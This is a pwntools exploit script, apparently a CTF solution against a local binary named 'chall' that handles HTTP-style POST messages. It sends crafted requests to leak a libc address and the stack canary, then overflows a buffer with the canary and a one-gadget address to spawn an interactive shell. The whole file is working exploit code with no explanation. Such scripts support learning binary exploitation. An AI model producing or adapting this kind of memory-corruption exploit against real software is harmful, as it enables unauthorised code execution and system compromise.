from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']

p = process("./chall")   

# gdb.attach(p,"b *0x555555555873")
# pause()

payload = '''POST /
Host: www.mrskye.com
Accept-Encoding: gzip
Content-Length: {}
Connection: close

{}'''

log.info("len:"+hex(len(payload)))

p.recvuntil("msg> ")
p.send(payload.format(8,'\x01'))
p.recvuntil("msg> ")
p.send(payload.format(96,'\x02'))
p.recv(8)
leak_addr = u64(p.recv(8))
log.info("leak_addr:"+hex(leak_addr))
libc_addr = leak_addr - (0x7ffff7dd5660-0x7ffff79e2000)
log.info("libc_addr:"+hex(libc_addr))
p.recv(0x48)
canary = u64(p.recv(8))
log.info("canary:"+hex(canary))
onegadget = libc_addr+0x10a41c
log.info("onegadget:"+hex(onegadget))

def getshell(len, text):
    return ('POST / HTTP/1.1\r\nHost: hills.tonen.et\r\nContent-Length: %d\r\n\r\n' % len) + text
 
p.recvuntil('msg> ')
payload = getshell(0x100,'\x01'+ 'a' * 0x58 + p64((canary) + 1) + 'a' * 0x8 + p64(onegadget))
p.sendline(payload)

p.recvuntil('msg> ')
payload = getshell(89, '\x01' + 'a' * 0x58)
p.send(payload)


p.interactive()